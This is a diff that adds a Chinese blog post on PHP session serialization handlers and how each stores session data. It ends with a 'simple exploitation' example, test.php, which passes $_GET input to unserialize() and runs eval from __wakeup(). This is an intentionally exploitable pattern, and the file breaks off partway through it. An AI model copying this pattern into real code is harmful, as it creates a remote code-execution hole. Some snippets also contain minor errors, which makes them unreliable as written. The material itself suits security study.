@@ -1,0 +1,618 @@
+---
+layout:     post
+title:      "session反序列化机制"
+date:       2014-02-17 13:15:00
+author:     "yangyang"
+header-img: "img/post-bg-2015.jpg"
+catalog: true
+tags:
+    - session
+---
+<div class="entry">
+
+    <p>在php.ini中存在三项配置项：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->
+
+    <div id="crayon-58150e20dfbe1827000586" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
+
+        <div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;"><span class="crayon-title"></span>
+            <div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;"><div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div><span class="crayon-language">PHP</span></div></div>
+        <div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
+        <div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
+session.save_path=""   --设置session的存储路径
+session.save_handler="" --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)
+session.auto_start   boolen --指定会话模块是否在请求开始时启动一个会话,默认为0不启动
+session.serialize_handler   string --定义用来序列化/反序列化的处理器名字。默认使用php</textarea></div>
+        <div class="crayon-main" style="">
+            <table class="crayon-table">
+                <tr class="crayon-row">
+                    <td class="crayon-nums " data-settings="show">
+                        <div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-58150e20dfbe1827000586-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfbe1827000586-2">2</div><div class="crayon-num" data-line="crayon-58150e20dfbe1827000586-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfbe1827000586-4">4</div></div>
+                    </td>
+                    <td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-58150e20dfbe1827000586-1"><span class="crayon-i">session</span><span class="crayon-sy">.</span><span class="crayon-i">save_path</span><span class="crayon-o">=</span><span class="crayon-s">""</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">--</span>设置<span class="crayon-i">session</span>的存储路径</div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfbe1827000586-2"><span class="crayon-i">session</span><span class="crayon-sy">.</span><span class="crayon-i">save_handler</span><span class="crayon-o">=</span><span class="crayon-s">""</span><span class="crayon-h"> </span><span class="crayon-o">--</span>设定用户自定义存储函数，如果想使用<span class="crayon-cn">PHP</span>内置会话存储机制之外的可以使用本函数<span class="crayon-sy">(</span>数据库等方式<span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-58150e20dfbe1827000586-3"><span class="crayon-i">session</span><span class="crayon-sy">.</span><span class="crayon-e">auto_start&nbsp;&nbsp; </span><span class="crayon-i">boolen</span><span class="crayon-h"> </span><span class="crayon-o">--</span>指定会话模块是否在请求开始时启动一个会话<span class="crayon-sy">,</span>默认为<span class="crayon-cn">0</span>不启动</div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfbe1827000586-4"><span class="crayon-i">session</span><span class="crayon-sy">.</span><span class="crayon-e">serialize_handler&nbsp;&nbsp; </span><span class="crayon-t">string</span><span class="crayon-h"> </span><span class="crayon-o">--</span>定义用来序列化<span class="crayon-o">/</span>反序列化的处理器名字。默认使用<span class="crayon-i">php</span></div></div></td>
+                </tr>
+            </table>
+        </div>
+    </div>
+    <!-- [Format Time: 0.0022 seconds] -->
+    <p>以上的选项就是与PHP中的Session存储和序列话存储有关的选项。<br />
+        在使用xampp组件安装中，上述的配置项的设置如下：</p>
+    <figure class="highlight nix"></figure>
+    <p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->
+
+    <div id="crayon-58150e20dfbea353167318" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
+
+        <div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;"><span class="crayon-title"></span>
+            <div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;"><div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div></div></div>
+        <div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
+        <div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
+session.save_path="D:\xampp\tmp"	表明所有的session文件都是存储在xampp/tmp下
+session.save_handler=files		  	表明session是以文件的方式来进行存储的
+session.auto_start=0				表明默认不启动session
+session.serialize_handler=php	   	表明session的默认序列话引擎使用的是php序列话引擎</textarea></div>
+        <div class="crayon-main" style="">
+            <table class="crayon-table">
+                <tr class="crayon-row">
+                    <td class="crayon-nums " data-settings="show">
+                        <div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-58150e20dfbea353167318-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfbea353167318-2">2</div><div class="crayon-num" data-line="crayon-58150e20dfbea353167318-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfbea353167318-4">4</div></div>
+                    </td>
+                    <td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-58150e20dfbea353167318-1"><span class="crayon-v">session</span><span class="crayon-sy">.</span><span class="crayon-v">save_path</span><span class="crayon-o">=</span><span class="crayon-s">"D:\xampp\tmp"</span><span class="crayon-h">	</span>表明所有的<span class="crayon-i">session</span>文件都是存储在<span class="crayon-v">xampp</span><span class="crayon-o">/</span><span class="crayon-i">tmp</span>下</div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfbea353167318-2"><span class="crayon-v">session</span><span class="crayon-sy">.</span><span class="crayon-v">save_handler</span><span class="crayon-o">=</span><span class="crayon-i">files</span><span class="crayon-h">		&nbsp;&nbsp;	</span>表明<span class="crayon-i">session</span>是以文件的方式来进行存储的</div><div class="crayon-line" id="crayon-58150e20dfbea353167318-3"><span class="crayon-v">session</span><span class="crayon-sy">.</span><span class="crayon-v">auto_start</span><span class="crayon-o">=</span><span class="crayon-cn">0</span><span class="crayon-h">				</span>表明默认不启动<span class="crayon-e">session</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfbea353167318-4"><span class="crayon-v">session</span><span class="crayon-sy">.</span><span class="crayon-v">serialize_handler</span><span class="crayon-o">=</span><span class="crayon-i">php</span><span class="crayon-h">	&nbsp;&nbsp; 	</span>表明<span class="crayon-i">session</span>的默认序列话引擎使用的是<span class="crayon-i">php</span>序列话引擎</div></div></td>
+                </tr>
+            </table>
+        </div>
+    </div>
+    <!-- [Format Time: 0.0013 seconds] -->
+    <p>在上述的配置中，<code>session.serialize_handler</code>是用来设置session的序列话引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。</p>
+    <ul>
+        <li>php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</li>
+        <li>php:存储方式是，键名+竖线+经过serialize()函数序列处理的值</li>
+        <li>php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值</li>
+    </ul>
+    <p>在PHP中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码<code>ini_set('session.serialize_handler', '需要设置的引擎');</code>。示例代码如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->
+
+    <div id="crayon-58150e20dfbee509471249" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
+
+        <div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;"><span class="crayon-title"></span>
+            <div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;"><div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div></div></div>
+        <div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
+        <div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
+&lt;?php
+ini_set('session.serialize_handler', 'php_serialize');
+session_start();
+// do something</textarea></div>
+        <div class="crayon-main" style="">
+            <table class="crayon-table">
+                <tr class="crayon-row">
+                    <td class="crayon-nums " data-settings="show">
+                        <div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-58150e20dfbee509471249-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfbee509471249-2">2</div><div class="crayon-num" data-line="crayon-58150e20dfbee509471249-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfbee509471249-4">4</div></div>
+                    </td>
+                    <td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-58150e20dfbee509471249-1"><span class="crayon-o">&lt;</span><span class="crayon-sy">?</span><span class="crayon-e">php</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfbee509471249-2"><span class="crayon-e">ini_set</span><span class="crayon-sy">(</span><span class="crayon-s">'session.serialize_handler'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'php_serialize'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-58150e20dfbee509471249-3"><span class="crayon-e">session_start</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfbee509471249-4"><span class="crayon-c">// do something</span></div></div></td>
+                </tr>
+            </table>
+        </div>
+    </div>
+    <!-- [Format Time: 0.0006 seconds] -->
+    <p></p>
+    <figure class="highlight hsp"></figure>
+    <h3 id="存储机制">存储机制</h3>
+    <p>php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项<code>session.save_handler</code>来进行确定的，默认是以文件的方式存储。<br />
+        存储的文件是以<code>sess_sessionid</code>来进行命名的，文件的内容就是session值的序列话之后的内容。<br />
+        假设我们的环境是xampp，那么默认配置如上所述。<br />
+        在默认配置情况下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->
+
+    <div id="crayon-58150e20dfbf2202859405" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
+
+        <div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;"><span class="crayon-title"></span>
+            <div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;"><span class="crayon-mixed-highlight" title="含多种语言"></span><div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div></div></div>
+        <div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
+        <div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
+&lt;?php
+session_start()
+$_SESSION['name'] = 'spoock';
+var_dump();
+?&gt;</textarea></div>
+        <div class="crayon-main" style="">
+            <table class="crayon-table">
+                <tr class="crayon-row">
+                    <td class="crayon-nums " data-settings="show">
+                        <div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-58150e20dfbf2202859405-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfbf2202859405-2">2</div><div class="crayon-num" data-line="crayon-58150e20dfbf2202859405-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfbf2202859405-4">4</div><div class="crayon-num" data-line="crayon-58150e20dfbf2202859405-5">5</div></div>
+                    </td>
+                    <td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-58150e20dfbf2202859405-1"><span class="crayon-ta">&lt;?php</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfbf2202859405-2"><span class="crayon-e">session_start</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-58150e20dfbf2202859405-3"><span class="crayon-v">$_SESSION</span><span class="crayon-sy">[</span><span class="crayon-s">'name'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'spoock'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfbf2202859405-4"><span class="crayon-e">var_dump</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-58150e20dfbf2202859405-5"><span class="crayon-ta">?&gt;</span></div></div></td>
+                </tr>
+            </table>
+        </div>
+    </div>
+    <!-- [Format Time: 0.0008 seconds] -->
+    <p></p>
+    <figure class="highlight xml"></figure>
+    <p>最后的session的存储和显示如下：<br />
+        <a class="fancybox" href="http://7xrnu9.com1.z0.glb.clouddn.com/php-sesssion/1.png" rel="group"><img src="http://7xrnu9.com1.z0.glb.clouddn.com/php-sesssion/1.png" alt="" /></a><br />
+        可以看到PHPSESSID的值是<code>jo86ud4jfvu81mbg28sl2s56c2</code>，而在<code>xampp/tmp</code>下存储的文件名是<code>sess_jo86ud4jfvu81mbg28sl2s56c2</code>，文件的内容是<code>name|s:6:"spoock";</code>。name是键值，<code>s:6:"spoock";</code>是<code>serialize("spoock")</code>的结果。</p>
+    <p>在php_serialize引擎下：</p>
+    <figure class="highlight xml"></figure>
+    <p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->
+
+    <div id="crayon-58150e20dfc01226368701" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
+
+        <div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;"><span class="crayon-title"></span>
+            <div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;"><span class="crayon-mixed-highlight" title="含多种语言"></span><div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div></div></div>
+        <div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
+        <div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
+&lt;?php
+ini_set('session.serialize_handler', 'php_serialize');
+session_start();
+$_SESSION['name'] = 'spoock';
+var_dump();
+?&gt;</textarea></div>
+        <div class="crayon-main" style="">
+            <table class="crayon-table">
+                <tr class="crayon-row">
+                    <td class="crayon-nums " data-settings="show">
+                        <div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-58150e20dfc01226368701-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc01226368701-2">2</div><div class="crayon-num" data-line="crayon-58150e20dfc01226368701-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc01226368701-4">4</div><div class="crayon-num" data-line="crayon-58150e20dfc01226368701-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc01226368701-6">6</div></div>
+                    </td>
+                    <td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-58150e20dfc01226368701-1"><span class="crayon-ta">&lt;?php</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc01226368701-2"><span class="crayon-e">ini_set</span><span class="crayon-sy">(</span><span class="crayon-s">'session.serialize_handler'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'php_serialize'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-58150e20dfc01226368701-3"><span class="crayon-e">session_start</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc01226368701-4"><span class="crayon-v">$_SESSION</span><span class="crayon-sy">[</span><span class="crayon-s">'name'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'spoock'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-58150e20dfc01226368701-5"><span class="crayon-e">var_dump</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc01226368701-6"><span class="crayon-ta">?&gt;</span></div></div></td>
+                </tr>
+            </table>
+        </div>
+    </div>
+    <!-- [Format Time: 0.0010 seconds] -->
+    <p>SESSION文件的内容是<code>a:1:{s:4:"name";s:6:"spoock";}</code>。<code>a:1</code>是使用php_serialize进行序列话都会加上。同时使用php_serialize会将session中的key和value都会进行序列化。</p>
+    <p>在php_binary引擎下：</p>
+    <figure class="highlight xml"></figure>
+    <p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->
+
+    <div id="crayon-58150e20dfc04679947150" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
+
+        <div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;"><span class="crayon-title"></span>
+            <div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;"><span class="crayon-mixed-highlight" title="含多种语言"></span><div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div></div></div>
+        <div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
+        <div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
+&lt;?php
+ini_set('session.serialize_handler', 'php_binary');
+session_start();
+$_SESSION['name'] = 'spoock';
+var_dump();
+?&gt;</textarea></div>
+        <div class="crayon-main" style="">
+            <table class="crayon-table">
+                <tr class="crayon-row">
+                    <td class="crayon-nums " data-settings="show">
+                        <div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-58150e20dfc04679947150-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc04679947150-2">2</div><div class="crayon-num" data-line="crayon-58150e20dfc04679947150-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc04679947150-4">4</div><div class="crayon-num" data-line="crayon-58150e20dfc04679947150-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc04679947150-6">6</div></div>
+                    </td>
+                    <td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-58150e20dfc04679947150-1"><span class="crayon-ta">&lt;?php</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc04679947150-2"><span class="crayon-e">ini_set</span><span class="crayon-sy">(</span><span class="crayon-s">'session.serialize_handler'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'php_binary'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-58150e20dfc04679947150-3"><span class="crayon-e">session_start</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc04679947150-4"><span class="crayon-v">$_SESSION</span><span class="crayon-sy">[</span><span class="crayon-s">'name'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'spoock'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-58150e20dfc04679947150-5"><span class="crayon-e">var_dump</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc04679947150-6"><span class="crayon-ta">?&gt;</span></div></div></td>
+                </tr>
+            </table>
+        </div>
+    </div>
+    <!-- [Format Time: 0.0009 seconds] -->
+    <p>SESSION文件的内容是<code>names:6:"spoock";</code>。由于<code>name</code>的长度是4，4在ASCII表中对应的就是<code>EOT</code>。根据php_binary的存储规则，最后就是<code>names:6:"spoock";</code>。(突然发现ASCII的值为4的字符无法在网页上面显示，这个大家自行去查ASCII表吧)</p>
+    <h3 id="序列化简单利用">序列化简单利用</h3>
+    <p>test.php</p>
+    <p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->
+
+    <div id="crayon-58150e20dfc07585724212" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
+
+        <div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;"><span class="crayon-title"></span>
+            <div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;"><span class="crayon-mixed-highlight" title="含多种语言"></span><div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div></div></div>
+        <div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
+        <div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
+&lt;?php
+class syclover{
+        var $func="";
+        function __construct() {
+            $this-&gt;func = "phpinfo()";
+        }
+        function __wakeup(){
+            eval($this-&gt;func);
+        }
+}
+unserialize($_GET['a']);
+?&gt;</textarea></div>
+        <div class="crayon-main" style="">
+            <table class="crayon-table">
+                <tr class="crayon-row">
+                    <td class="crayon-nums " data-settings="show">
+                        <div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-58150e20dfc07585724212-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc07585724212-2">2</div><div class="crayon-num" data-line="crayon-58150e20dfc07585724212-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc07585724212-4">4</div><div class="crayon-num" data-line="crayon-58150e20dfc07585724212-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc07585724212-6">6</div><div class="crayon-num" data-line="crayon-58150e20dfc07585724212-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc07585724212-8">8</div><div class="crayon-num" data-line="crayon-58150e20dfc07585724212-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc07585724212-10">10</div><div class="crayon-num" data-line="crayon-58150e20dfc07585724212-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc07585724212-12">12</div></div>
+                    </td>
+                    <td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-58150e20dfc07585724212-1"><span class="crayon-ta">&lt;?php</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc07585724212-2"><span class="crayon-t">class</span><span class="crayon-h"> </span><span class="crayon-e">syclover</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-58150e20dfc07585724212-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">$func</span><span class="crayon-o">=</span><span class="crayon-s">""</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc07585724212-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">__construct</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-58150e20dfc07585724212-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$this</span><span class="crayon-o">-&gt;</span><span class="crayon-i">func</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"phpinfo()"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc07585724212-6"><span 